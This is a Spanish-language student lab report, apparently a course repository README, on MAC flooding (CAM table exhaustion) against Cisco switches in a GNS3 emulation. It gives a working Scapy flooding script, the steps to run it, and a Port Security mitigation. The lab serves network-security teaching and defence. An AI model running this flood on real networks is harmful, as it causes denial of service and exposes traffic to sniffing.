
# 🛡️ Security Audit: MAC Flooding (CAM Table Exhaustion)

---

<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>


## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui](https://youtu.be/9RNu9AntwB0?si=LP0dSbk9Uvq92zAP)

---

## 🎯 1. Objetivo del Laboratorio

El propósito de esta auditoría técnica es evaluar la resiliencia de la tabla de memoria direccionable por contenido (**CAM Table**) en un conmutador Cisco de Capa 2. La práctica demuestra cómo un desbordamiento masivo de direcciones MAC aleatorias fuerza al dispositivo a degradar su comportamiento operativo (*Fail-Open Mode*), transformándolo en un Hub e induciendo un escenario propicio para la interceptación de tráfico (*Sniffing*). Asimismo, se valida la efectividad de las directivas de **Port Security** como contención perimetral.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** operando bajo el segmento IP personalizado `10.25.83.0/24`.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | f0/0.83 | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | f0/0.99 | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | Vlan99 | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | Vlan99 | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | eth0 | Acceso Estático | 10.25.83.99 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | e0 | Acceso Dinámico | Asignada DHCP | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnico-Operativa del Script

### Análisis de Operación a Bajo Nivel

El script automatiza un ataque de denegación de servicio (DoS) a la memoria del switch. Utiliza generadores nativos de Scapy (`RandMAC()` y `RandIP()`) para estructurar tramas Ethernet falsas a máxima velocidad. Cada paquete inyectado obliga al switch a registrar una nueva asociación puerto-MAC en su memoria volátil, saturando el espacio de almacenamiento físico en cuestión de segundos.

### Requisitos de Entorno

* **OS Emisor:** Kali Linux 2026.1 o superior.
* **Librerías:** Scapy (`sudo apt install python3-scapy`).
* **Marcador de Firma:** Cadena de texto `"LAB-2025-0839"` incrustada en el Payload para rastreo forense institucional.

### Código de la Herramienta (`mac_flooding.py`)

```python
#!/usr/bin/env python3
from scapy.all import *

print("[*] Iniciando saturación de tabla CAM (MAC Flooding)...")

# Utiliza la función nativa de Scapy para generar bucles de alta velocidad
pkt = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/"LAB-2025-0839"

try:
    sendp(pkt, iface="eth0", loop=1, verbose=False)
except KeyboardInterrupt:
    print("\n[-] MAC Flooding detenido.")

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Comprobar la Línea Base de la Tabla CAM

Antes del ataque, verifique la cantidad de direcciones MAC conocidas en el Switch de Acceso (**SW2**). El conteo debe ser mínimo (solo dispositivos legítimos):

```text
SW2# show mac address-table count

```

### Paso 2: Lanzamiento de la Inundación de Tramas

Asigne permisos de ejecución al script y ejecútelo bajo privilegios de administrador para permitir la inyección directa en sockets de red:

```bash
chmod +x mac_flooding.py
sudo ./mac_flooding.py

```

### Paso 3: Monitoreo de Saturación Crítica

Mientras el script corre, ejecute de manera recurrente el comando de verificación en **SW2**. Observará un incremento exponencial en las entradas registradas hasta llegar al límite de la capacidad física de la plataforma:

```text
SW2# show mac address-table
SW2# show mac address-table count

```

> **Nota de Impacto:** Una vez saturada la tabla, verifique desde el **PC1** cómo comienza a recibir paquetes Unicast que originalmente iban destinados exclusivamente a la máquina Kali, confirmando que el Switch está operando en modo broadcast difuso.

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> Para evitar la suplantación de identidad y el agotamiento de recursos en la Capa 2, es mandatorio limitar y amarrar el número de direcciones MAC permitidas por puerto físico.

### Configuración Defensiva (Copiar y pegar en SW2)

Aplique políticas estrictas de seguridad de puerto (**Port Security**) en los rangos asignados a terminales de usuario final:

```text
configure terminal
interface range GigabitEthernet0/3 , GigabitEthernet1/0
 switchport mode access
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation shutdown
 switchport port-security aging time 2
end

```

### Comprobación de la Eficiencia de la Defensa

Al reejecutar el script desde Kali Linux tras aplicar la mitigación, el Switch identificará que la cuarta dirección MAC generada viola el límite configurado (`maximum 3`). Inmediatamente, la lógica de seguridad desactivará el puerto para mitigar la amenaza:

```text
SW2# show interfaces status err-disabled

```

El estado del puerto **Gi0/3** cambiará de forma automática a `err-disabled`, aislando por completo al atacante y manteniendo la integridad del resto de los segmentos de red de la institución.

---

## ⚖️ 6. Aviso de Uso Académico

Este repositorio se ha desarrollado exclusivamente bajo un enfoque estrictamente educativo para dar cumplimiento a los requerimientos de la materia de **Seguridad de Redes** en el **ITLA**. El uso de estas herramientas en infraestructuras de producción sin autorización previa constituye un delito informático según las normativas legales locales.
